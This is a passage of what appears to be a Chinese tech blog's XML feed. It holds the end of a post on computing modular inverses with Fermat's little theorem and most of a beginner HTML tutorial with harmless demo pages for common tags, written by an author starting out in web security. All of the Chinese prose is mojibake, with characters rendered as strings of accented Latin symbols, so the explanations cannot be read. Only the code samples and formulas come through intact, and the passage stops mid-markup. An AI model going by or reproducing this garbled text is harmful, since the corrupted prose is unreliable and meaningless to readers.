æ˜¯ä¸€ä¸ªå…³ç³»ä»£æ•°ã€‚</p><p>ä»£æ•°ä¸­ï¼Œæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µå°±æ˜¯å¹ºå…ƒ ï¼Œå¹ºå…ƒæ˜¯æŒ‡ä¸ä»»æ„æ•°è¿›è¡Œå…³ç³»è¿ç®—ç»“æœéƒ½ç­‰äºé‚£ä¸ªæ•°ï¼Œæ¯”å¦‚åœ¨åŠ æ³•è¿ç®—ä¸­ï¼Œ0å°±æ˜¯å¹ºå…ƒï¼Œå› ä¸º0åŠ ä»»ä½•æ•°éƒ½ç­‰äºä»»ä½•æ•°å˜›ã€‚åœ¨ä¹˜æ³•ä¸­ï¼Œ1å°±æ˜¯å¹ºå…ƒï¼ŒåŒæ ·1ä¹˜ä»»ä½•æ•°ä¹Ÿç­‰äºä»»ä½•æ•°ã€‚è€Œé€†å…ƒå°±æ˜¯è¯´ä¸¤ä¸ªæ•°ç›¸äº’è¿›è¡Œå…³ç³»è¿ç®—ä¹‹åå¾—åˆ°å¹ºå…ƒï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæ•°å°±äº’ç§°ä¸ºå¯¹æ–¹çš„é€†å…ƒã€‚</p><p>è€Œæˆ‘ä»¬å¹³æ—¶ç®—æ³•ç«èµ›ç ”ç©¶çš„ä»£æ•°ä½“ç³»é€šå¸¸æ˜¯ä¹˜æ³•å–æ¨¡è¿ç®—ï¼Œå®ƒå…¶å®è·Ÿä¹˜æ³•ç±»ä¼¼ï¼Œå°±å¤šä¸ªå–æ¨¡ï¼Œå–æ¨¡ä¹Ÿé™å®šäº†å®ƒé›†åˆçš„æœ‰é™æ€§ã€‚åœ¨ä¹˜æ³•æ¨¡è¿ç®—ä¸­ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°1æ˜¯å¹ºå…ƒã€‚æ‰€ä»¥è‹¥ $b$ æ˜¯ $a$ åœ¨æ¨¡ $m$ æ„ä¹‰ä¸‹çš„é€†å…ƒï¼Œåˆ™æœ‰ $a\times b \equiv 1 \pmod p$ã€‚è€Œè¿™ä¸ª1æˆ‘ä»¬ç¨å¾®ç”¨ä¸€ä¸‹è´¹é©¬å°å®šç†ï¼ŒæŠŠå®ƒå˜æˆ $a^{p-1}$ï¼Œé‚£ä¹ˆæ•´ä¸ªå¼å­å°±å˜æˆäº† $b\equiv a^{p-2}\ (mod\ p)$ã€‚æˆ‘ä»¬å°±èƒ½å·²çŸ¥å…¶ä¸­ä¸€ä¸ªæ•°ç®—å‡ºå¦ä¸€ä¸ªæ•°çš„é€†å…ƒäº†ï¼Œè‡³äºå¹‚è¿ç®—å¯ä»¥ä½¿ç”¨å¿«é€Ÿå¹‚è§£å†³ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç®—ä¸€ä¸ªæ•°çš„é€†å…ƒçš„å¤æ‚åº¦å°±æ˜¯ $O(log_2p)$ äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> æ•°è®º </category>
          
          <category> è´¹é©¬å°å®šç† </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>htmlè¯­è¨€çš„å­¦ä¹ </title>
      <link href="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æ¥å­¦å­¦ <code>html</code> (è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€)ã€‚</p><p>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€)æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºç½‘é¡µçš„æ ‡å‡†æ ‡è®°è¯­è¨€ã€‚</p><span id="more"></span><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æƒ³å½»å½»åº•åº•å­¦ä¸€é <code>web</code> å®‰å…¨ï¼Œå…ˆä»æœ€åŸºæœ¬çš„ <code>html</code> å¼€å§‹å§ï¼Œé¦–å…ˆ <code>html</code> æ˜¯ç»™æµè§ˆå™¨æ‰§è¡Œçš„è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´ <code>html</code> æ˜¯åœ¨æˆ‘ä»¬æœ¬åœ°çš„ï¼Œæ˜¯å‰ç«¯è¯­è¨€ï¼Œç›¸å <code>php</code> å°±æ˜¯åç«¯è¯­è¨€äº†ï¼Œåœ¨æœåŠ¡å™¨æ‰§è¡Œå®Œå¾—åˆ°ç»“æœä¹‹åä»¥ <code>html</code> çš„å½¢å¼è¿”å›ç»™ç”¨æˆ·ï¼Œå…ˆæœ€åŸºæœ¬äº†è§£ä¸€ä¸‹ <code>html</code> æœ‰ä¸€ä¸ªæ¸…æ™°çš„æ¦‚å¿µã€‚</p><h2 id="htmlè¯­æ³•"><a href="#htmlè¯­æ³•" class="headerlink" title="htmlè¯­æ³•"></a>htmlè¯­æ³•</h2><p><code>html</code> è¯­æ³•è¾ƒä¸ºæ¾æ•£ï¼Œä»¥è‡³äºä½ åŸºæœ¬è§ä¸åˆ°å› ä¸º <code>html</code> æŠ¥çš„é”™ï¼ˆè¿™ä¹Ÿå°±æ›´åŠ è€ƒéªŒäº†æˆ‘ä»¬çš„ä»£ç åŠŸåº•ï¼Œå› ä¸ºå†™é”™äº†æŸäº›ä¸œè¥¿å®ƒä¸ä¼šæŠ¥é”™çš„ï¼‰ã€‚<code>html</code> è¯´åˆ°åº•å®ƒå°±æ˜¯ç”±æ ‡ç­¾(æœ‰æ—¶å€™ä¹Ÿæˆä¸ºâ€å…ƒç´ â€)å’Œå¯¹åº”çš„å±æ€§ç»„æˆçš„ï¼Œä¸‡ç§è¯­è¨€éƒ½æœ‰è‡ªå·±çš„ <code>hello world</code>ï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå…ˆå†™ä¸€ä¸ª <code>hello world</code>ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            hello world!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠå®ƒæ”¾åˆ°æˆ‘ä»¬æ­å»ºçš„ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œç”¨æµè§ˆå™¨è®¿é—® <code>127.0.0.1</code> çœ‹çœ‹ï¼Œè¯·æ³¨æ„ï¼Œå†™å¥½çš„ <code>html</code> æ–‡ä»¶ä¸è¦ç›´æ¥æ‰“å¼€ï¼Œå…»æˆå¥½ä¹ æƒ¯ï¼Œä½¿ç”¨<code>http</code> åè®®è®¿é—®å®ƒï¼Œç”¨ <code>file</code> åè®®è™½ç„¶èƒ½è®¿é—®åˆ°ï¼Œä½†æ˜¯å½“éœ€è¦æ‰§è¡Œ <code>php</code> è„šæœ¬çš„æ—¶å€™ä¼šå‡ºç°å¾ˆå¤šéº»çƒ¦ã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><h3 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h3><p>é‚£ä¹ˆæˆ‘ä»¬æ¥ç»†ç»†è®²è®²æ ‡ç­¾ã€‚</p><p>æ ‡ç­¾å°±æ˜¯ç”±ä¸€å¯¹å°–æ‹¬å· <code>&lt;&gt;</code>ç»„æˆçš„ï¼Œæ ‡ç­¾çš„åŸºæœ¬å½¢å¼å°±æ˜¯ <code>&lt;æ ‡ç­¾å&gt;xxx&lt;/æ ‡ç­¾å&gt;</code>ï¼Œå¯ä»¥åµŒå¥—å…¶å®ƒæ ‡ç­¾ã€‚</p><p>å½“ç„¶ä¹Ÿæœ‰å•èº«ç‹—æ ‡ç­¾æ˜¯è‡ªå·±ä¸€ä¸ªäººå½“ä¸€ä¸ªæ ‡ç­¾ï¼Œå½¢å¦‚<code>&lt;æ ‡ç­¾å/&gt;</code> ï¼Œä¸èƒ½åµŒå¥—å…¶å®ƒæ ‡ç­¾ã€‚</p><p>æ ‡ç­¾å¯ä»¥ç›¸äº’åµŒå¥—ï¼Œåœ¨ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸éš¾å‘ç° <code>html</code> æ ‡ç­¾å†…åŒ…å« <code>body</code> æ ‡ç­¾ï¼Œ<code>body</code> æ ‡ç­¾åŒ…å« <code>div</code> æ ‡ç­¾ã€‚æˆ‘ä»¬è¿˜å¯ä»¥å‘ç°ï¼Œæ ‡ç­¾ä¸ä¼šç›´æ¥æ˜¾ç¤ºåœ¨ç½‘é¡µä¸­ï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½ä» <code>F12</code> çš„æ§åˆ¶å°ä¸­çœ‹è§æˆ‘ä»¬å†™çš„ <code>html</code> ä»£ç ã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>æ ‡ç­¾å¯ä»¥åµŒå¥—æ–‡å­—ï¼Œè¿™äº›æ–‡å­—ä¼šä¾é™„æ ‡ç­¾ï¼Œå¹¶æ ¹æ®æ ‡ç­¾çš„ç‰¹æ€§æ˜¾ç¤ºæ–‡å­—ã€‚</p><h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>å±æ€§ä¼šå†™åœ¨å¼€å§‹æ ‡ç­¾çš„å°–æ‹¬å·å†…ï¼Œä¸€èˆ¬å½¢å¼ä¸º <code>&lt;æ ‡ç­¾å å±æ€§å1=å±æ€§å€¼1 å±æ€§å2=å±æ€§å€¼2 ...&gt;</code>ã€‚æ¯”å¦‚ç°åœ¨æƒ³ç©ç‚¹èŠ±çš„ï¼Œæˆ‘ä¸æƒ³æ˜¾ç¤ºæ™®é€šçš„ <code>hello world</code> ï¼Œæˆ‘æƒ³æ¢ä¸ªé¢œè‰²ï¼Œæ¯”å¦‚çº¢è‰²ï¼Œæˆ‘æ¢æˆå¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span></span><br><span class="line">            hello world!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å› ä¸º <code>div</code> æ ‡ç­¾ä¸æ”¯æŒ <code>color</code> å±æ€§ï¼Œå› æ­¤è¿™é‡Œæ¢æˆ <code>font</code> æ ‡ç­¾ï¼Œå¯ä»¥çœ‹åˆ°è¾¾åˆ°äº†æˆ‘ä»¬é¢„æœŸçš„æ•ˆæœã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­çš„ <code>font</code> æ ‡ç­¾æˆ‘ä»¬å°±ä¸ºä»–æŒ‡å®šäº†å±æ€§ï¼Œå±æ€§åä¸º <code>color</code>ï¼Œå¯¹åº”çš„å€¼ä¸º <code>&quot;red&quot;</code> ï¼Œè¡¨ç¤ºäº†è¿™ä¸ªæ ‡ç­¾çš„å†…å®¹å°†æ˜¾ç¤ºçº¢è‰²å­—ä½“ã€‚</p><h3 id="å¸¸ç”¨æ ‡ç­¾"><a href="#å¸¸ç”¨æ ‡ç­¾" class="headerlink" title="å¸¸ç”¨æ ‡ç­¾"></a>å¸¸ç”¨æ ‡ç­¾</h3><ul><li><code>div</code>ï¼šä½œä¸ºå¸ƒå±€å®¹å™¨</li><li><code>a</code>æ ‡ç­¾ï¼šç”¨ä½œç‚¹å‡»è·³è½¬</li><li><code>img</code>ï¼šæ˜¾ç¤ºå›¾ç‰‡ï¼Œå•ä¸ªå‡ºç°</li><li><code>table,tr,td</code>ï¼šè¡¨æ ¼</li><li><code>ul,ol</code>ï¼šåˆ—è¡¨</li><li><code>h1-h6</code>ï¼š1-6çº§æ ‡é¢˜</li><li><code>br</code>ï¼šæ¢è¡Œ</li><li><code>input</code>ï¼šè¡¨å•ç±»</li></ul><h4 id="div"><a href="#div" class="headerlink" title="div"></a>div</h4><p>è¿™ä¸ªæš‚æ—¶å…ˆä¸è®²ï¼Œåº”è¯¥ç­‰åˆ°åé¢è®²å¸ƒå±€çš„æ—¶å€™ä¼šè¯´åˆ°</p><h4 id="a"><a href="#a" class="headerlink" title="a"></a>a</h4><p>ç½‘é¡µè·³è½¬æ˜¯æˆ‘ä»¬æ¯”è¾ƒç†ŸçŸ¥çš„åŠŸèƒ½äº†ï¼Œæ¯”å¦‚æˆ‘ <code>google</code> æœå‡ºæ¥å¾ˆå¤šç»“æœï¼Œç»“æœä¸å¯èƒ½æ˜¾ç¤ºæ•´ä¸ªé¡µé¢ï¼Œå®ƒä¼šç»™å‡ºä¸€ä¸ªæ ‡é¢˜ï¼Œç„¶åè®¾ç½®è¶…é“¾æ¥è·³è½¬åˆ°è¿™ä¸ªé¡µé¢ï¼Œ<code>a</code> æ ‡ç­¾å°±æ˜¯ä¸“é—¨ç”¨æ¥åšè·³è½¬çš„ï¼Œæ ‡ç­¾åŒ…æ‹¬çš„å†…å®¹å°†å…¨éƒ¨ä¼šè¢«è®¾ä¸Šè¶…é“¾æ¥è·³è½¬åˆ° <code>href</code> å±æ€§æŒ‡å®šçš„é“¾æ¥åœ°å€ã€‚å¦‚æœè·³è½¬åˆ°æœ¬ç«™çš„æŸä¸ªé¡µé¢ï¼Œç›´æ¥ä»ç½‘ç«™æ ¹ç›®å½•å¼€å§‹æŒ‡å®šè·¯å¾„å³å¯ï¼Œå¦‚æœè·³è½¬åˆ°å¤–ç«™çš„è¯åˆ™éœ€è¦ä» <code>http://</code> å¼€å§‹ä¹¦å†™è¶…é“¾æ¥ã€‚</p><h5 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://xia0ji233.pro/&quot;</span>&gt;</span></span><br><span class="line">                è¿™æ˜¯ä¸€ä¸ªè¶…é“¾æ¥</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹çœ‹æ•ˆæœï¼š</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" alt="4"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé¼ æ ‡æ‚¬åœåœ¨æ–‡æœ¬çš„æ—¶å€™ä¼šæ˜¾ç¤ºè¶…é“¾æ¥é“¾æ¥çš„åœ°å€ï¼Œç‚¹å‡»å¯ä»¥è·³è½¬åˆ°å¯¹åº”çš„é¡µé¢ã€‚</p><h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><p>æ˜¾ç¤ºå›¾ç‰‡çš„æ ‡ç­¾ï¼Œå•ä¸ªå‡ºç°ï¼Œç”± <code>src</code> å±æ€§æŒ‡å®šå›¾ç‰‡è·¯å¾„ï¼Œå¦‚æœå›¾ç‰‡åœ¨æœ¬ç«™åˆ™å¯ä»¥ç›´æ¥ä»æ ¹ç›®å½•æŒ‡å®šè·¯å¾„ï¼Œå¼•ç”¨ç«™å¤–å›¾ç‰‡åˆ™éœ€è¦ä¹¦å†™å›¾ç‰‡å®Œæ•´çš„è¶…é“¾æ¥ã€‚</p><h5 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/1.jpg&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå¼•ç”¨å›¾ç‰‡</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png" alt="5"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªä»£ç æ¥å¼•ç”¨ç«™å¤–å›¾ç‰‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://codeforces.org/s/14146/images/codeforces-logo-with-telegram.png&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼•ç”¨ <code>codeforces</code> çš„ <code>logo</code>ã€‚</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/6.png" alt="6"></p><h4 id="tr-td"><a href="#tr-td" class="headerlink" title="tr,td"></a>tr,td</h4><p>è¿™ä¸ªæˆ‘ä¹Ÿè¿˜åœ¨æ‘¸ç´¢ï¼Œä¸è¿‡ç»è¿‡æˆ‘è‡ªå·±çš„æµ‹è¯•å¤§æ¦‚èƒ½è®²å‡ºä¸€äºŒï¼Œ<code>tr</code> ä¸ºä¸€è¡Œï¼Œç„¶å <code>td</code> ä¸ºä¸€è¡Œä¸­çš„ä¸€åˆ—æ ‡ç­¾ã€‚ ç”¨æ•°æ®åº“çš„æœ¯è¯­æ¥è¯´å‘¢ï¼Œå°±æ˜¯ï¼š<code>&lt;tr&gt;</code> æ ‡ç­¾ä¸ºä¸€æ¡æ•´è®°å½•ï¼Œ <code>&lt;td&gt;</code> æ ‡ç­¾ä¸ºä¸€æ¡è®°å½•çš„å…¶ä¸­ä¸€ä¸ªå­—æ®µçš„å€¼ã€‚</p><p>æˆ‘ä»¬ä¹Ÿå†™ä¸€ä¸ªdemo</p><h5 id="demo-2"><a href="#demo-2" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        aaaaaaaaaaaaa</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        bbbbbbbb</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        cccccc</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        ddd</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ•ˆæœå¦‚ä¸‹</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/7.png" alt="7"></p><h4 id="ul-ol"><a href="#ul-ol" class="headerlink" title="ul,ol"></a>ul,ol</h4><p>è¿™ä¿©æ˜¯æ— åºåˆ—è¡¨å’Œæœ‰åºåˆ—è¡¨ï¼Œç»å¸¸ç”¨ <code>markdown</code> å†™åšå®¢çš„å¸ˆå‚…å¯¹è¿™ä¸ªåº”è¯¥ä¸ä¼šå¾ˆé™Œç”Ÿï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æ•ˆæœä»¥åŠå·®å¼‚å³å¯ã€‚</p><h5 id="demo-3"><a href="#demo-3" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ddd<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>eee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>fff<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ggg<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>hhh<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/8.png" alt="8"></p><p>å°†ä»£ç ä¸­çš„ <code>ul</code> æ¢æˆ <code>ol</code> ä¹‹åå‘¢ï¼Œæ•ˆæœæ˜¯è¿™æ ·çš„</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/9.png" alt="9"></p><h4 id="h1-h6"><a href="#h1-h6" class="headerlink" title="h1-h6"></a>h1-h6</h4><p>1-6çº§çš„æ ‡é¢˜ã€‚</p><h5 id="demo-4"><a href="#demo-4" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>è¿™æ˜¯ä¸€çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>è¿™æ˜¯äºŒçº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>è¿™æ˜¯ä¸‰çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h4</span>&gt;</span>è¿™æ˜¯å››çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h5</span>&gt;</span>è¿™æ˜¯äº”çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h6</span>&gt;</span>è¿™æ˜¯å…­çº§æ ‡é¢˜<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/10.png" alt="10"></p><h4 id="br"><a href="#br" class="headerlink" title="br"></a>br</h4><p>æ¢è¡Œæ ‡ç­¾ï¼Œå°±è·Ÿæˆ‘ä»¬ <code>C</code> é‡Œé¢çš„ <code>\n</code> ä¸€æ ·ä¸€æ ·çš„ã€‚</p><h5 id="demo-5"><a href="#demo-5" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 